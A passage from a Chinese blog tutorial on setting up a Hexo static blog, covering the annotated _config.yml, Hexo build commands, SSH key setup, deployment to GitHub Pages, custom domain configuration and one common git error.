href="https://hexo.io/docs/configuration.html">https://hexo.io/docs/configuration.html</a></p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 对照看着一下改就好:</span></span><br><span class="line"><span class="comment"># Hexo Configuration</span></span><br><span class="line"><span class="comment">## Docs: http://zespia.tw/hexo/docs/configure.html</span></span><br><span class="line"><span class="comment">## Source: https://github.com/tommy351/hexo/</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Site </span></span><br><span class="line"><span class="attr">title:</span> <span class="string">My</span> <span class="string">Blog</span> <span class="comment">#博客名</span></span><br><span class="line"><span class="attr">subtitle:</span> <span class="string">to</span> <span class="string">be</span> <span class="string">continued...</span> <span class="comment">#副标题</span></span><br><span class="line"><span class="attr">description:</span> <span class="string">My</span> <span class="string">blog</span> <span class="comment">#给搜索引擎看的，对网站的描述，可以自定义</span></span><br><span class="line"><span class="attr">author:</span> <span class="string">Yourname</span> <span class="comment">#作者，在博客底部可以看到</span></span><br><span class="line"><span class="attr">email:</span> <span class="string">yourname@yourmail.com</span> <span class="comment">#你的联系邮箱</span></span><br><span class="line"><span class="attr">language:</span> <span class="string">zh-CN</span> <span class="comment">#中文。如果不填则默认英文</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># URL #这项暂不配置，绑定域名后，欲创建sitemap.xml需要配置该项</span></span><br><span class="line"><span class="comment">## If your site is put in a subdirectory, set url as &#x27;http://yoursite.com/child&#x27; and root as &#x27;/child/&#x27;</span></span><br><span class="line"><span class="attr">url:</span> <span class="string">http://yoursite.com</span></span><br><span class="line"><span class="attr">root:</span> <span class="string">/</span></span><br><span class="line"><span class="attr">permalink:</span> <span class="string">:year/:month/:day/:title/</span></span><br><span class="line"><span class="attr">tag_dir:</span> <span class="string">tags</span></span><br><span class="line"><span class="attr">archive_dir:</span> <span class="string">archives</span></span><br><span class="line"><span class="attr">category_dir:</span> <span class="string">categories</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Writing 文章布局、写作格式的定义，不修改</span></span><br><span class="line"><span class="attr">new_post_name:</span> <span class="string">:title.md</span> <span class="comment"># File name of new posts</span></span><br><span class="line"><span class="attr">default_layout:</span> <span class="string">post</span></span><br><span class="line"><span class="attr">auto_spacing:</span> <span class="literal">false</span> <span class="comment"># Add spaces between asian characters and western characters</span></span><br><span class="line"><span class="attr">titlecase:</span> <span class="literal">false</span> <span class="comment"># Transform title into titlecase</span></span><br><span class="line"><span class="attr">max_open_file:</span> <span class="number">100</span></span><br><span class="line"><span class="attr">filename_case:</span> <span class="number">0</span></span><br><span class="line"><span class="attr">highlight:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">backtick_code_block:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">line_number:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">tab_replace:</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Category &amp; Tag</span></span><br><span class="line"><span class="attr">default_category:</span> <span class="string">uncategorized</span></span><br><span class="line"><span class="attr">category_map:</span></span><br><span class="line"><span class="attr">tag_map:</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Archives 默认值为2，这里都修改为1，相应页面就只会列出标题，而非全文</span></span><br><span class="line"><span class="comment">## 2: Enable pagination</span></span><br><span class="line"><span class="comment">## 1: Disable pagination</span></span><br><span class="line"><span class="comment">## 0: Fully Disable</span></span><br><span class="line"><span class="attr">archive:</span> <span class="number">1</span></span><br><span class="line"><span class="attr">category:</span> <span class="number">1</span></span><br><span class="line"><span class="attr">tag:</span> <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Server 不修改</span></span><br><span class="line"><span class="comment">## Hexo uses Connect as a server</span></span><br><span class="line"><span class="comment">## You can customize the logger format as defined in</span></span><br><span class="line"><span class="comment">## http://www.senchalabs.org/connect/logger.html</span></span><br><span class="line"><span class="attr">port:</span> <span class="number">4000</span></span><br><span class="line"><span class="attr">logger:</span> <span class="literal">false</span></span><br><span class="line"><span class="attr">logger_format:</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Date / Time format 日期格式，可以修改成自己喜欢的格式</span></span><br><span class="line"><span class="comment">## Hexo uses Moment.js to parse and display date</span></span><br><span class="line"><span class="comment">## You can customize the date format as defined in</span></span><br><span class="line"><span class="comment">## http://momentjs.com/docs/#/displaying/format/</span></span><br><span class="line"><span class="attr">date_format:</span> <span class="string">YYYY-M-D</span></span><br><span class="line"><span class="attr">time_format:</span> <span class="string">H:mm:ss</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Pagination 每页显示文章数，可以自定义，贴主设置的是10</span></span><br><span class="line"><span class="comment">## Set per_page to 0 to disable pagination</span></span><br><span class="line"><span class="attr">per_page:</span> <span class="number">10</span></span><br><span class="line"><span class="attr">pagination_dir:</span> <span class="string">page</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Disqus Disqus插件，我们会替换成“多说”，不修改</span></span><br><span class="line"><span class="attr">disqus_shortname:</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Extensions 这里配置站点所用主题和插件，暂时默认</span></span><br><span class="line"><span class="comment">## Plugins: https://github.com/tommy351/hexo/wiki/Plugins</span></span><br><span class="line"><span class="comment">## Themes: https://github.com/tommy351/hexo/wiki/Themes</span></span><br><span class="line"><span class="attr">theme:</span> <span class="string">landscape</span></span><br><span class="line"><span class="attr">exclude_generator:</span></span><br><span class="line"><span class="attr">plugins:</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">hexo-generator-feed</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">hexo-generator-sitemap</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Deployment 站点部署到github要配置(重点！！！)</span></span><br><span class="line"><span class="comment">## Docs: http://zespia.tw/hexo/docs/deploy.html</span></span><br><span class="line"><span class="attr">deploy:</span></span><br><span class="line">  <span class="attr">type:</span> <span class="string">git</span></span><br><span class="line">  <span class="attr">repository:</span> <span class="string">//这里是需要填的，下面会讲</span></span><br><span class="line">  <span class="attr">branch:</span> <span class="string">master</span></span><br></pre></td></tr></table></figure><p>按需修改完后一套小连招即可重新部署</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hexo clean # 清除缓存文件，建议写完文章后执行一次</span><br><span class="line">hexo g# 生成 public 文件夹，写完文章执行</span><br><span class="line">hexo s# 启动 hexo 服务</span><br></pre></td></tr></table></figure><h1 id="部署到github托管"><a href="#部署到github托管" class="headerlink" title="部署到github托管"></a>部署到github托管</h1><p>没有github账号的先注册一个账号</p><p>设置git的全局变量</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git config --global user.name &quot;user_name&quot; # user_name填入GitHub用户名</span><br><span class="line">git config --global user.email &quot;user_email&quot; # user_email填入GitHub注册的邮箱</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2024/11/21/xI1bSfFK8qw3zG7.png"></p><p>新建一个 Repository，Repository name一定要是<code>你的用户名.github.io</code>，记得设为<code>public</code>，公开可见</p><p><img src="https://s2.loli.net/2024/11/21/gIcN7pMoRE3iQJv.png"></p><p><img src="https://s2.loli.net/2024/11/21/FCERKnY5LNVDlJ1.png"></p><p>然后在github配置ssh-key</p><p>访问<code>C:\Users\你的用户名\.ssh</code>目录，如果存在 id_rsa.pub 文件则复制其文件内容，如果不存在则生成一个</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa -C &quot;user.email&quot; # user.email为GitHub上注册的邮箱</span><br></pre></td></tr></table></figure><p><font style="color:rgb(64, 62, 62);">然后直接三个回车即可，默认不需要设置密码，没太大必要</font></p><p><font style="color:rgb(64, 62, 62);">复制内容后，这就是你的公钥，访问 </font><a href="https://github.com/settings/keys">https://github.com/settings/keys</a> <font style="color:rgb(64, 62, 62);">添加到github</font></p><p><img src="https://s2.loli.net/2024/11/21/tXZe5hTvDa8PWx4.png"></p><p><img src="https://s2.loli.net/2024/11/21/GT1NPKFtzcfjRdy.png"></p><p><font style="color:rgb(64, 62, 62);">然后我们在Git Bash中验证是否连接成功</font></p><p><img src="https://s2.loli.net/2024/11/21/xz7MpQR5bKPocS8.png"></p><p>修改<code>_config.yml</code>的配置项</p><p><img src="https://s2.loli.net/2024/11/21/HFVWPQaKnNOv9pj.png"></p><p>然后就可以准备开始部署了，在git之前需要下载插件，需要在刚刚的博客目录下安装哦</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-deployer-git --save</span><br></pre></td></tr></table></figure><p>然后一套小连招部署到github</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">hexo clean</span><br><span class="line">hexo g</span><br><span class="line">hexo s</span><br><span class="line">hexo d     // 部署</span><br></pre></td></tr></table></figure><h1 id="配置个人域名"><a href="#配置个人域名" class="headerlink" title="配置个人域名"></a>配置个人域名</h1><p>在买域名的服务商处配置CNAME记录</p><p><img src="https://s2.loli.net/2024/11/21/ltRNZrvSbmqXnsa.png"></p><p>在仓库中找到设置</p><p><img src="https://s2.loli.net/2024/11/21/w5qFCD7zhjePlK9.png"></p><p>写上需要解析的域名</p><p><img src="https://s2.loli.net/2024/11/21/IofvMUmgHwGBRqK.png"></p><p>然后就可以了</p><h1 id="报错解决"><a href="#报错解决" class="headerlink" title="报错解决"></a>报错解决</h1><h3 id="fatal-not-a-git-repository-or-any-of-the-parent-directories-git"><a href="#fatal-not-a-git-repository-or-any-of-the-parent-directories-git" class="headerlink" title="fatal: not a git repository (or any of the parent directories): .git"></a>fatal: not a git repository (or any of the parent directories): .git</h3><p>虽然不知道为啥报错，但是<font style="color:rgb(85, 85, 85);">将hexo根目录下的.deploy_git&#x2F;删除掉，重新部署即可</font></p><p><img src="https://s2.loli.net/2024/11/21/PZSkOJhzq52XWs6.png"></p><p><img src="https://s2.loli.net/2024/11/21/8n2CZPsW7jdD4Om.png"></p>]]></content>
      
      
      <categories>
          
          <category> environment </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hexo </tag>
            
            <tag> environment </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
